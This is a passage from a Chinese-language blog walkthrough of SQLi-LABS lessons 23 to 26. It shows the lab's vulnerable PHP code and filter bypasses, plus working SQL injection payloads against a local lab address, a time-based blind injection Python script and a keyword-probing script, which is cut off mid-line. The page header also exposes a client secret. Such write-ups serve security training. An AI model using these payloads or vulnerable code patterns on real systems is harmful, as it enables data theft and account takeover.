<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="SQLi-LABS Page-2 (Adv Injections)"><meta name="keywords" content="sql注入,web安全"><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>SQLi-LABS Page-2 (Adv Injections)【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-23"><span class="toc-number">1.</span> <span class="toc-text">Less-23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-24"><span class="toc-number">2.</span> <span class="toc-text">Less-24</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-25"><span class="toc-number">3.</span> <span class="toc-text">Less-25</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-25a"><span class="toc-number">4.</span> <span class="toc-text">Less-25a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-26"><span class="toc-number">5.</span> <span class="toc-text">Less-26</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-26a"><span class="toc-number">6.</span> <span class="toc-text">Less-26a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-27"><span class="toc-number">7.</span> <span class="toc-text">Less-27</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-27a"><span class="toc-number">8.</span> <span class="toc-text">Less-27a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-28"><span class="toc-number">9.</span> <span class="toc-text">Less-28</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-28a"><span class="toc-number">10.</span> <span class="toc-text">Less-28a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-29"><span class="toc-number">11.</span> <span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-30"><span class="toc-number">12.</span> <span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-31"><span class="toc-number">13.</span> <span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-32"><span class="toc-number">14.</span> <span class="toc-text">Less-32</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-33"><span class="toc-number">15.</span> <span class="toc-text">Less-33</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-34"><span class="toc-number">16.</span> <span class="toc-text">Less-34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-35"><span class="toc-number">17.</span> <span class="toc-text">Less-35</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-36"><span class="toc-number">18.</span> <span class="toc-text">Less-36</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-37"><span class="toc-number">19.</span> <span class="toc-text">Less-37</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-38"><span class="toc-number">20.</span> <span class="toc-text">Less-38</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color8"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color10"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color4"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">183</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">151</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">SQLi-LABS Page-2 (Adv Injections)</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-06-09 | 更新于 2020-06-16</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div></div></div><div class="main-content"><p>SQLI-LABS 2</p>
<a id="more"></a>

<h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><p>过滤了#、–的注释</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>1.可以使用 ;%00 来绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-23/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">3</span>;%00</span><br></pre></td></tr></table></figure>
<p>这样分号之前的语句会被执行，%00是空格的意思，所以这是一种绕过限制的方式。<br>2.闭合引号,报错注入<br>or ‘a’=’a   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.7&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x5c,(select user()),0x5c)) or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>


<h1 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h1><p>二次注入的方法：注册时候将sql语句插入了数据库，当再次调用这个恶意构造的字符时，就可以出发sql注入  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">$curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">$pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($pass==$re_pass)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br><span class="line">	$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">	$row = mysql_affected_rows();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">	<span class="keyword">if</span>($row==<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password successfully updated"</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		header(<span class="string">'Location: failed.php'</span>);</span><br><span class="line">		<span class="comment">//echo 'You tried to be smart, Try harder!!!! :( ';</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;&lt;center&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Make sure New Password and Retype Password fields have same value"</span>;</span><br><span class="line">	header(<span class="string">'refresh:2, url=index.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先注册</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; #</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
<p>然后再修改密码就可以修改已知用户的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>

<p>其中修改密码的sql执行如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;admin&#39; where username&#x3D;&#39;admin&#39; # and password&#x3D;&#39;test&#39; &quot;;</span><br></pre></td></tr></table></figure>

<h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><p>过滤了or and 也影响了 order 和informatinon_shchema 两个关键字   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">	$id= blacklist($id);</span><br><span class="line">	$hint=$id;</span><br><span class="line">	$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tips<br>1.and 用&amp;&amp; 代替，or 用||代替<br>2.利用重写:or 用oorr 代替,and 用anandd 代替   </p>
<p>answer:<br>判断是否有注入<br>注意： &amp;在url中会被当做参数的分隔符，所以要编码一下  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-25/?id=1' %26%26 '1'='1</span><br><span class="line">http://192.168.3.7/sqli/Less-25/?id=1' %26%26 '1'='2</span><br></pre></td></tr></table></figure>
<p>判断字段数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-25/?id=1' oorrder by  4<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>得到数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-25/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> infoorrmation_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()  <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><p>整形注入，过滤了and和or</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://192.168.3.7/sqli/Less-25a/?id=1  "</span></span><br><span class="line">    payload=<span class="string">"%26%26 if((ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)"</span></span><br><span class="line">    info=<span class="string">""</span></span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        left=<span class="number">0x20</span></span><br><span class="line">        right=<span class="number">0x7f</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid=left+(right-left)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> left==mid:</span><br><span class="line">                <span class="keyword">if</span> mid==<span class="number">0x20</span>:</span><br><span class="line">                    flag=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                info=info+chr(left)</span><br><span class="line">                print(info)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            startTime=time.time()</span><br><span class="line">            tmppayload=url+payload.format(i,mid)</span><br><span class="line">            requests.get(tmppayload)</span><br><span class="line">            endTime=time.time()</span><br><span class="line">            spendTime=endTime-startTime</span><br><span class="line">            <span class="keyword">if</span> spendTime &gt;=<span class="number">3</span>:</span><br><span class="line">                right=mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left=mid</span><br><span class="line"></span><br><span class="line">binary()</span><br></pre></td></tr></table></figure>

<h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><p>过滤如下面的blacklist,过滤了注释、空格、or、and</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line">	$id= blacklist($id);</span><br><span class="line">	$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;	</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>可以写一个脚本判断过滤了什么</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">sqlDict=[<span class="string">'--'</span>, <span class="string">'or'</span>, <span class="string">'%26'</span>, <span class="string">'%23'</span>, <span class="string">'OR'</span>, <span class="string">'and'</span>, <span class="string">'length'</span>, <span class="string">'handler'</span>, <span class="string">'like'</span>, <span class="string">'select'</span>, <span class="string">'sleep'</span>, <span class="string">'database'</span>, <span class="string">'delete'</span>, <span class="string">'having'</span>, <span class="string">'as'</span>, <span class="string">'-~'</span>, <span class="string">'BENCHMARK'</span>, <span class="string">'limit'</span>, <span class="string">'left'</span>, <span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'right'</span>, <span class="string">'INFORMATION'</span>, <span class="string">'--'</span>, <span class="string">';'</span>, <span class="string">'!'</span>, <span class="string">'%'</span>, <span class="string">'xor'</span>, <span class="string">'&lt;&gt;'</span>, <span class="string">'('</span>, <span class="string">'&gt;'</span>, <span class="string">'&lt;'</span>, <span class="string">')'</span>, <span class="string">'.'</span>, <span class="string">'^'</span>, <span class="string">'='</span>, <span class="string">'AND'</span>, <span class="string">'BY'</span>, <span class="string">'CAST'</span>, <span class="string">'COLUMN'</span>, <span class="string">'COUNT'</span>, <span class="string">'CREATE'</span>, <span class="string">'END'</span>, <span class="string">'case'</span>, <span class="string">"'1'='1"</span>, <span class="string">'when'</span>, <span class="string">"admin'"</span>, <span class="string">'"'</span>, <span class="string">'length'</span>, <span class="string">'length'</span>, <span class="string">'REVERSE'</span>, <span class="string">'ascii'</span>, <span class="string">'select'</span>, <span class="string">'database'</span>, <span class="string">'left'</span>, <span class="string">'right'</span>, <span class="string">'union'</span>, <span class="string">'"'</span>, <span class="string">'||'</span>, <span class="string">'oorr'</span>, <span class="string">'/'</span>, <span class="string">'//'</span>, <span class="string">'//*'</span>, <span class="string">'*/*'</span>, <span class="string">'/**/'</span>, <span class="string">'anandd'</span>, <span class="string">'GROUP'</span>, <span class="string">'HAVING'</span>, <span class="string">'IF'</span>, <span class="string">'INTO'</span>, <span class="string">'JOIN'</span>, <span class="string">'LEAVE'</span>, <span class="string">'LEFT'</span>, <span class="string">'LEVEL'</span>, <span class="string">'sleep'</span>, <span class="string">'LIKE'</span>, <span class="string">'NAMES'</span>, <span class="string">'NEXT'</span>, <span class="string">'NULL'</span>, <span class="string">'OF'</span>, <span class="string">'ON'</span>, <span class="string">'|'</span>, <span class="string">'infromation_schema'</span>, <span class="string">'user'</span>, <span class="string">'OR'</span>, <span class="string">'ORDER'</span>, <span class="string">'ORD'</span>, <span class="string">'SCHEMA'</span>, <span class="string">'SELECT'</span>, <span class="string">'SET'</span>, <span class="string">'TABLE'</span>, <span class="string">'THEN'</span>, <span class="string">'UNION'</span>, <span class="string">'UPDATE'</span>, <span class="string">'USER'</span>, <span class="string">'USING'</span>, <span class="string">'VALUE'</span>, <span class="string">'VALUES'</span>, <span class="string">'WHEN'</span>, <span class="string">'WHERE'</span>, <span class="string">'ADD'</span>, <span class="string">'AND'</span>, <span class="string">'prepare'</span>, <span class="string">'set'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'drop'</span>, <span class="string">'inset'</span>, <span class="string">'CAST'</span>, <span class="string">'COLUMN'</span>, <span class="string">'CONCAT'</span>, <span class="string">'GROUP_CONCAT'</span>, <span class="string">'group_concat'</span>, <span class="string">'CREATE'</span>, <span class="string">'DATABASE'</span>, <span class="string">'DATABASES'</span>, <span class="string">'alter'</span>, <span class="string">'DELETE'</span>, <span class="string">'DROP'</span>, <span class="string">'floor'</span>, <span class="string">'rand()'</span>, <span class="string">'information_schema.tables'</span>, <span class="string">'TABLE_SCHEMA'</span>, <span class="string">'concat_ws()'</span>, <span class="string">'concat'</span>, <span class="string">'LIMIT'</span>, <span class="string">'ORD'</span>, <span class="string">'ON'</span>, <span class="string">'extractvalue'</span>, <span class="string">'order'</span>, <span class="string">'CAST()'</span>, <span class="string">'by'</span>, <span class="string">'ORDER'</span>, <span class="string">'OUTFILE'</span>, <span class="string">'RENAME'</span>, <span class="string">'REPLACE'</span>, <span class="string">'SCHEMA'</span>, <span class="string">'SELECT'</span>, <span class="string">'SET'</span>, <span class="string">'updatexml'</span>, <span class="string">'SHOW'</span>, <span class="string">'SQL'</span>, <span class="string">'TABLE'</span>, <span class="string">'THEN'</span>, <span class="string">'TRUE'</span>, <span class="string">'instr'</span>, <span class="string">'benchmark'</span>, <span class="string">'format'</span>, <span class="string">'bin'</span>, <span class="string">'substring'</span>, <span class="string">'ord'</span>, <span class="string">'UPDATE'</span>, <span class="string">'VALUES'</span>, <span class="string">'VARCHAR'</span>, <span class="string">'VERSION'</span>, <span class="string">'WHEN'</span>, <span class="string">'WHERE'</span>, <span class="string">'/*'</span>, <span class="string">'`'</span>, <span class="string">','</span>, <span class="string">'users'</span>, <span class="string">'mid'</span>, <span class="string">'for'</span>, <span class="string">'BEFORE'</span>, <span class="string">'REGEXP'</span>, <span class="string">'RLIKE'</span>, <span class="string">'in'</span>, <span class="string">'sys'</span>, <span class="string">'schema'</span>, <span class="string">'sp ace'</span>, <span class="string">'SEPARATOR'</span>, <span class="string">'XOR'</span>, <span class="string">'CURSOR'</span>, <span class="string">'FLOOR'</span>, <span class="string">'sys.schema_table_statistics_with_buffer'</span>, <span class="string">'INFILE'</span>, <span class="string">'count'</span>, <span class="string">'from'</span>, <span class="string">'='</span>, <span class="string">'@'</span>, <span class="string">'else'</span>]</span><br><span class="line">url = <span 